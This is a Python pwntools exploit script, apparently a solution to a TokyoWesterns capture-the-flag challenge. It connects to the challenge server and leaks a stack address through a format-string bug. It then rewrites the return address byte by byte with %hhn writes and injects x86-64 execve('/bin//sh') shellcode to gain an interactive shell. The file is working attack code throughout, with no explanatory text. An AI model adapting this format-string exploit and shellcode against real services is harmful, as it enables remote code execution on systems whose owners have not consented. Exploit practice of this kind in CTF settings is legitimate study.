from pwn import *


def fsb_leak(fmt):
    io.sendlineafter(b'> ', fmt)
    return io.recvline().rstrip()

def fsb(fmt):
    io.sendlineafter(b'> ', fmt)


binpath = './nothing-26b04ea96b5042f561f666beef1870de15d6b048b43dfca877b01ceef1fa82b0'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
b *0x00000000004007B5
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn02.chal.ctf.westerns.tokyo', 18247)


shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

addr_addr_ret = int(fsb_leak(b'%12$p'), 16) + 0xa8
addr_buf = addr_addr_ret - 0x108
addr_shellcode = addr_buf + 8
print('addr_addr_ret: 0x{:x}'.format(addr_addr_ret))
print('addr_buf: 0x{:x}'.format(addr_buf))

for i, b in enumerate(p64(addr_shellcode)):
    if b == 0:
        continue
    payload = b''
    payload += b'%%%dc%%%d$hhn' % (b, 9)
    assert len(payload) < 24
    payload += b'A' * (24 - len(payload))
    payload += p64(addr_addr_ret + i)
    fsb(payload)

payload = b''
payload += b'A' * 8
payload += shellcode
fsb(payload)
print('quit')
fsb(b'q')
io.interactive()
